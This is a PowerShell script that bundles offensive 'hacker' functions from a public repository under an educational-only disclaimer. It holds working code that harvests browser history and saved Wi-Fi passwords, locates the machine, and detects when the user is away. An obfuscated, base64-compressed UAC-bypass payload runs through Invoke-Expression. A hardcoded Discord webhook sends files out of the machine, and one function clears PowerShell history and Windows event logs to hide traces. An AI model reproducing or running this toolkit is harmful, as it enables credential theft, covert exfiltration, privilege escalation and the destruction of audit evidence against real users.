# PowerShell-for-Hackers: Combined Functions
# A collection of hacking functions from I-Am-Jakoby's PowerShell-for-Hackers repository
# Warning: For educational purposes only. Do not use for malicious purposes.
# Original source: https://github.com/I-Am-Jakoby/PowerShell-for-Hackers

# =========================================================================================================
# Function: Get-BrowserData
# Description: Retrieves browsing history and bookmarks from Edge, Chrome, and Firefox
# =========================================================================================================

function Get-BrowserData {
    [CmdletBinding()]
    param (	
        [Parameter (Position=1, Mandatory = $False)]
        [string]$Browser = "all",    
        [Parameter (Position=2, Mandatory = $False)]
        [string]$DataType = "all"
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    $AllData = @()

    function Extract-BrowserData {
        param (
            [string]$Browser,
            [string]$DataType,
            [string]$Path
        )
        
        try {
            if (Test-Path -Path $Path) {
                $Value = Get-Content -Path $Path -ErrorAction SilentlyContinue | Select-String -AllMatches $regex | ForEach-Object {($_.Matches).Value} | Sort-Object -Unique
                $Value | ForEach-Object {
                    New-Object -TypeName PSObject -Property @{
                        User = $env:UserName
                        Browser = $Browser
                        DataType = $DataType
                        Data = $_
                    }
                }
            }
        } catch {
            Write-Error "Error extracting data from $Browser $DataType at $Path"
        }
    }
        
    if ($Browser -eq "all" -or $Browser -eq "chrome") {
        if ($DataType -eq "all" -or $DataType -eq "history") {
            $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
            $AllData += Extract-BrowserData -Browser "chrome" -DataType "history" -Path $Path
        }
        if ($DataType -eq "all" -or $DataType -eq "bookmarks") {
            $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
            $AllData += Extract-BrowserData -Browser "chrome" -DataType "bookmarks" -Path $Path
        }
    }

    if ($Browser -eq "all" -or $Browser -eq "edge") {
        if ($DataType -eq "all" -or $DataType -eq "history") {
            $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
            $AllData += Extract-BrowserData -Browser "edge" -DataType "history" -Path $Path
        }
        if ($DataType -eq "all" -or $DataType -eq "bookmarks") {
            $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
            $AllData += Extract-BrowserData -Browser "edge" -DataType "bookmarks" -Path $Path
        }
    }

    if ($Browser -eq "all" -or $Browser -eq "firefox") {
        if ($DataType -eq "all" -or $DataType -eq "history") {
            $Path = (Get-ChildItem -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" -ErrorAction SilentlyContinue | Select-Object -First 1).FullName
            $AllData += Extract-BrowserData -Browser "firefox" -DataType "history" -Path $Path
        }
    }

    return $AllData
}

# =========================================================================================================
# Function: UAC-Bypass
# Description: Bypasses UAC to run commands with admin privileges
# =========================================================================================================

function Bypass {
    [CmdletBinding()]
    param (
        [Parameter (Position=0, Mandatory = $True)]
        [string]$code
    )

    (nEw-OBJECt Io.CoMpreSsion.DEflateSTrEaM([SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg('hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv'),[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress) | ForeacH{nEw-OBJECt Io.StReaMrEaDer($_,[SySTEM.teXT.enCOdING]::aSciI)}).rEaDTOEnd() | InVoKE-expREssION
}

# Function to check if running as admin
function Test-Admin {
    return ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# =========================================================================================================
# Function: Detect-Mouse-Movement
# Description: Two functions to detect if target leaves or returns to computer
# =========================================================================================================

function Target-Comes {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Seconds $pauseTime
        }
    }
}

function Target-Leaves {
    [CmdletBinding()]
    param (	
        [Parameter (Position=0, Mandatory = $True)]
        [Int]$Seconds
    ) 
    Add-Type -AssemblyName System.Windows.Forms

    while (1) {
        $originalPOS = [System.Windows.Forms.Cursor]::Position.X
        Start-Sleep -Seconds $Seconds
        if ([Windows.Forms.Cursor]::Position.X -eq $originalPOS){
            break
        }
        else {
            Start-Sleep -Seconds 1
        }
    }
}

# =========================================================================================================
# Function: Discord-Upload
# Description: Uploads files or text to Discord
# =========================================================================================================

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text 
    )

    $hookurl = 'https://discord.com/api/webhooks/1365634072679809115/8AVn3x8Hu_7v1Z5a6WRWHdjfm2x-WqwsnEREI3Rss_Vp1TONSpr-KLvBCxTU-d0nStBE'

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $hookurl
    }
}

# =========================================================================================================
# Function: Get-GeoLocation
# Description: Gets geolocation of target machine
# =========================================================================================================

function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
        $GeoWatcher.Start() #Begin resolving current location

        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100 #Wait for discovery.
        }  

        if ($GeoWatcher.Permission -eq 'Denied'){
            Write-Error 'Access Denied for Location Information'
        } else {
            $GL = $GeoWatcher.Position.Location | Select-Object Latitude, Longitude #Select the relevant results.
            $GL = $GL -split " "
            $Lat = $GL[0].Substring(11) -replace ".$"
            $Lon = $GL[1].Substring(10) -replace ".$" 
            return $Lat, $Lon
        }
    }
    catch {
        Write-Error "No coordinates found" 
        return "No Coordinates found"
        -ErrorAction SilentlyContinue
    } 
}

# =========================================================================================================
# Function: Get-WifiInfo
# Description: Gets information about Wi-Fi networks
# =========================================================================================================

# Get Nearby Networks
function Get-NearbyNetworks {
    return (netsh wlan show networks mode=Bssid | Where-Object {$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
}

# Get Current Network
function Get-CurrentNetwork {
    $pro = netsh wlan show interface | Select-String -Pattern ' SSID '; $pro = [string]$pro; $pos = $pro.IndexOf(':'); $pro = $pro.Substring($pos+2).Trim()
    $pass = netsh wlan show profile $pro key=clear | Select-String -Pattern 'Key Content'; $pass = [string]$pass; $passPOS = $pass.IndexOf(':'); $pass = $pass.Substring($passPOS+2).Trim()
    return "$pro : $pass"
}

# Get All Networks
function Get-AllNetworks {
    # Get Network Interfaces
    $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -notlike $null } | Select-Object Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

    # Get Wifi SSIDs and Passwords	
    $WLANProfileNames = @()

    # Get all the WLAN profile names
    $Output = netsh.exe wlan show profiles | Select-String -pattern " : "

    # Trim the output to receive only the name
    Foreach ($WLANProfileName in $Output) {
        $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
    }
    $WLANProfileObjects = @()

    # Bind the WLAN profile names and also the password to a custom object
    Foreach ($WLANProfileName in $WLANProfileNames) {
        # Get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
        try {
            $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | Select-String -Pattern "Key Content") -split ":")[1]).Trim()
        }
        Catch {
            $WLANProfilePassword = "The password is not stored in this profile"
        }

        # Build the object and add this to an array
        $WLANProfileObject = New-Object PSCustomObject 
        $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
        $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
        $WLANProfileObjects += $WLANProfileObject
        Remove-Variable WLANProfileObject    
    }
    return $WLANProfileObjects
}

# =========================================================================================================
# Function: Set-Volume
# Description: Sets the volume level
# =========================================================================================================

function Set-Volume {
    param(
        [Parameter(Mandatory=$true)]
        [ValidateRange(0,100)]
        [Int]
        $Volume
    )

    # Create audio object
    $wshShell = new-object -com wscript.shell
    
    # Set volume - typically there are 50 key presses from 0-100
    $keyPresses = [Math]::Ceiling($Volume / 2)
    
    # Mute the volume first
    1..50 | ForEach-Object {
        $wshShell.SendKeys([char]174)
    }
    
    # Then raise it to desired level
    1..$keyPresses | ForEach-Object {
        $wshShell.SendKeys([char]175)
    }
}

# =========================================================================================================
# Function: Clean-Exfil
# Description: Cleans up traces
# =========================================================================================================

function Start-CleanExfil {
    [CmdletBinding()]
    param (
        [Parameter(Position=0, Mandatory=$False)]
        [string]$CustomTempPath = "",
        
        [Parameter(Position=1, Mandatory=$False)]
        [switch]$ClearEventLogs = $false
    )
    
    try {
        # Clean custom temp path if provided
        if ($CustomTempPath -ne "" -and (Test-Path -Path $CustomTempPath)) {
            Remove-Item -Path "$CustomTempPath\*" -Force -Recurse -ErrorAction SilentlyContinue
            Write-Host "Cleaned custom temp directory: $CustomTempPath" -ForegroundColor Green
        }
        
        # Clear PowerShell history
        if (Test-Path -Path (Get-PSReadlineOption).HistorySavePath) {
            Clear-Content -Path (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
            Write-Host "Cleared PowerShell history" -ForegroundColor Green
        }
        
        # Clean up common temp locations
        $tempPaths = @(
            "$env:TEMP\*.zip",
            "$env:TEMP\*.tmp",
            "$env:TEMP\exfil*"
        )
        
        foreach ($path in $tempPaths) {
            Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
        }
        
        # Clear event logs if specified
        if ($ClearEventLogs) {
            if (Test-Admin) {
                $logNames = @("Application", "System", "Security", "PowerShell")
                foreach ($log in $logNames) {
                    wevtutil cl $log
                }
                Write-Host "Cleared Windows Event Logs" -ForegroundColor Green
            } else {
                Write-Warning "Admin privileges required to clear Event Logs"
            }
        }
        
        Write-Host "Cleanup completed successfully" -ForegroundColor Green
        return $true
    } catch {
        Write-Error "Error during cleanup: $_"
        return $false
    }
}

# =========================================================================================================
# Function: Set-WallPaper
# Description: Changes the desktop wallpaper
# =========================================================================================================

function Set-WallPaper {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$Path,
        
        [Parameter(Mandatory=$false)]
        [ValidateSet('Center', 'Fill', 'Fit', 'Stretch', 'Tile')]
        [string]$Style = 'Fill'
    )
    
    $WallpaperStyle = @{
        'Center' = 0
        'Tile' = 1
        'Stretch' = 2
        'Fit' = 6
        'Fill' = 10
    }
    
    $StyleValue = $WallpaperStyle[$Style]
    
    # Check if the file exists
    if (-not (Test-Path -Path $Path)) {
        Write-Error "File not found: $Path"
        return
    }
    
    # Get absolute path
    $Path = (Resolve-Path $Path).Path
    
    # Set registry values
    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value $StyleValue -Force
    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name TileWallpaper -Value $(if ($Style -eq 'Tile') {1} else {0}) -Force
    
    # Apply wallpaper using SystemParametersInfo
    Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        
        public class Wallpaper {
            [DllImport("user32.dll", CharSet = CharSet.Auto)]
            public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        }
"@
    
    $SPI_SETDESKWALLPAPER = 0x0014
    $SPIF_UPDATEINIFILE = 0x01
    $SPIF_SENDCHANGE = 0x02
    
    $result = [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Path, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
    
    if ($result) {
        Write-Output "Wallpaper changed successfully"
    } else {
        Write-Error "Failed to change wallpaper"
    }
}

# =========================================================================================================
# Function: Message Box
# Description: Shows a message box
# =========================================================================================================

function MsgBox {
    [CmdletBinding()]
    param (
        [Parameter(Position=0, Mandatory=$True)]
        [string]$Message,
        
        [Parameter(Position=1, Mandatory=$False)]
        [string]$Title = "Message",
        
        [Parameter(Position=2, Mandatory=$False)]
        [ValidateSet("OK", "OKCancel", "AbortRetryIgnore", "YesNoCancel", "YesNo", "RetryCancel")]
        [string]$ButtonType = "OK",
        
        [Parameter(Position=3, Mandatory=$False)]
        [ValidateSet("None", "Hand", "Error", "Stop", "Question", "Exclamation", "Warning", "Asterisk", "Information")]
        [string]$IconType = "Information"
    )
    
    # Map button types to integer values
    $ButtonMap = @{
        "OK" = 0
        "OKCancel" = 1
        "AbortRetryIgnore" = 2
        "YesNoCancel" = 3
        "YesNo" = 4
        "RetryCancel" = 5
    }
    
    # Map icon types to integer values
    $IconMap = @{
        "None" = 0
        "Hand" = 16
        "Error" = 16
        "Stop" = 16
        "Question" = 32
        "Exclamation" = 48
        "Warning" = 48
        "Asterisk" = 64
        "Information" = 64
    }
    
    $ButtonValue = $ButtonMap[$ButtonType]
    $IconValue = $IconMap[$IconType]
    
    # Combine values for the MessageBox options
    $Options = $ButtonValue -bor $IconValue
    
    # Create the MessageBox
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.MessageBox]::Show($Message, $Title, $ButtonValue, $IconValue)
}

# =========================================================================================================
# Function: Text-to-Speech
# Description: Speaks text using the system voice
# =========================================================================================================

function Speak {
    param (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$Text,
        
        [Parameter(Mandatory=$false, Position=1)]
        [int]$Volume = 100,
        
        [Parameter(Mandatory=$false, Position=2)]
        [int]$Rate = 0
    )
    
    # Load the required assembly
    Add-Type -AssemblyName System.Speech
    
    # Create a speech synthesizer
    $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    
    # Set volume (0-100)
    $synth.Volume = $Volume
    
    # Set rate (-10 to 10, where 0 is normal)
    $synth.Rate = $Rate
    
    # Speak the text
    $synth.Speak($Text)
    
    # Clean up
    $synth.Dispose()
}

# =========================================================================================================
# Function: B64 Encode/Decode
# Description: Encodes or decodes text in Base64
# =========================================================================================================

function B64-Encode {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Text
    )
    
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
    $encoded = [Convert]::ToBase64String($bytes)
    return $encoded
}

function B64-Decode {
    param (
        [Parameter(Mandatory=$true)]
        [string]$EncodedText
    )
    
    $bytes = [Convert]::FromBase64String($EncodedText)
    $decoded = [System.Text.Encoding]::Unicode.GetString($bytes)
    return $decoded
}

# =========================================================================================================
# Usage Examples
# =========================================================================================================

# Example: Get browser data
# $browserData = Get-BrowserData

# Example: Check if running as Admin
# if (Test-Admin) { Write-Host "Running as admin" } else { Write-Host "Not running as admin" }

# Example: Get geolocation
# $lat, $lon = Get-GeoLocation
# Write-Host "Location: $lat, $lon"

# Example: Get Wi-Fi networks
# $networks = Get-AllNetworks
# $networks | Format-Table

# Example: Set volume to 50%
# Set-Volume -Volume 50

# Example: Show message box
# MsgBox -Message "Hello World" -Title "Test" -ButtonType "YesNo" -IconType "Question"

# Example: Speak text
# Speak -Text "Hello, I am speaking to you through your computer"

# Example: Set wallpaper (provide a valid path)
# Set-WallPaper -Path "C:\path\to\wallpaper.jpg" -Style "Fill"

# Example: Upload to Discord (replace with your webhook)
# Upload-Discord -text "Hello from PowerShell" -file "C:\path\to\file.txt"

# Example: Base64 encoding/decoding
# $encoded = B64-Encode -Text "Hello World"
# $decoded = B64-Decode -EncodedText $encoded
# Write-Host "Encoded: $encoded"
# Write-Host "Decoded: $decoded"

Write-Host "PowerShell-for-Hackers: All functions loaded successfully" -ForegroundColor Green 
